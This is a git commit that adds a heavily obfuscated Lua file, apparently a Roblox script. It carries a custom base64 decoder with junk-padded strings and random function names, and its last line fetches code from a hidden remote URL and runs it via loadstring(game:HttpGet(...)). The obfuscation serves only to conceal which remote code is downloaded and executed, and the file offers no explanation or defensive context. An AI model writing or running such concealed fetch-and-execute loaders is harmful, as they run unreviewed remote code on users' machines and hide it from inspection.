82717a9e9ec06fb75d2b3c57883c13e2280e3350
neptune-bgsi <anthonykummerling@students.cciu.org>
2025-05-02 15:50:39 -0400

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,19 @@
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+local b=TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('xpTEiYWIdMZsxSwYmUXTvYiwgXQlVzsWHIQqneMUhxoHJdRKyMXKLUyQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLw==')
+function ZZjHqihapGOOqLDDBjPCaedTQgppLDNvCGjESypatyS(data) m=string.sub(data, 0, 55) data=data:gsub(m,TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('MHMQrUIZsflGKyfweuuKAfLGNxBFaOWtfUujjJYMozwcaUBBzOZLPDL'))
+
+data = string.gsub(data, TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('KcnJZqYgKQagHFJQKPUpsfXHTVksgmjSMGDqeTvAOzNeeAoRzzRNDvvW14=')..b..TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('OnGuzBPMOyDPugWNgVSxQjoruUkZSTvCqWQNDIMhGfBsHegLxwIDVDMPV0='), TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('eDDyBRWFDgPqgPAMoHEMtNWyFGTYYPiZEplsNDonhmeeBvOPngPIGcY')) return (data:gsub(TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('fZElTbotKByJLjPsPWtLJdiqbYriJXrpAucVZXWghuZbopHHYVLGVNqLg=='), function(x) if (x == TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('sKLmHslPEiWmRcbOkgbZxRWcOXUXpWmqggxqeuDYvNWZtUdaDivofTsPQ==')) then return TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('odloKMDiWyXwnlrHQdwNKESXImRCzyGCzEBBBlBnWrVuiYlXHceVgeE') end local r,f=TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('yFyakYjydnRMrEnmqnjjAVCfPKmxilsFpIEbCpnTgNWDCafwqJgOoqd'),(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('mOvrZdWstalCeCpsPZOVygoRDjQBuusEUwMSVNGmmRYggwQFQFCuuyqMQ==') or TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('eVfLNfnxUmlnLJuySssdYZjmnUtbufAveZnXIdfitofbWnJMnCPZoZVMA==')) end return r; end):gsub(TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('ijPkpVcjEknMSgaePRSmlrxwUDApNYevzkMZiyVjCnxqEmKOdLBTtIoJWQlZCVkPyVkPyVkPyVkPyVkPyVkPw=='), function(x) if (#x ~= 8) then return TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('PSLUJxQhyNVSrceBcOfHwZSzrkzHXoLCrNeSmuHzzwuNkxRMhnMOnsd') end local c=0 for i=1,8 do c=c+(x:sub(i,i)==TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('TWesbBzdPhddNVppZxjpEOzOOKQUPmwwNCefksUbTuPyYGFftEwKAjpMQ==') and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+loadstring(game:HttpGet(ZZjHqihapGOOqLDDBjPCaedTQgppLDNvCGjESypatyS(TuxTpZeiOtmBWWrpkJczNhqvPGbNBsJJPkfTYiIjLraKuSHMjUFgOroXFadID('ynmbjjSrzXTZiAlVDRaiHbAqjAAcfRMlOnvUUMSOhtHvDyETZhlTzuIVUxZR2lTZ3BCZnFGbnFPendSTXlNSU11QVZXdVhQY3lyZ1dnbHlXSGtLdHhYTXRpSHVFdmJQb2FIUjBjSE02THk5d1lYTjBaV0pwYmk1amIyMHZjbUYzTDJwaVJWcFpSbEpw'))))()    
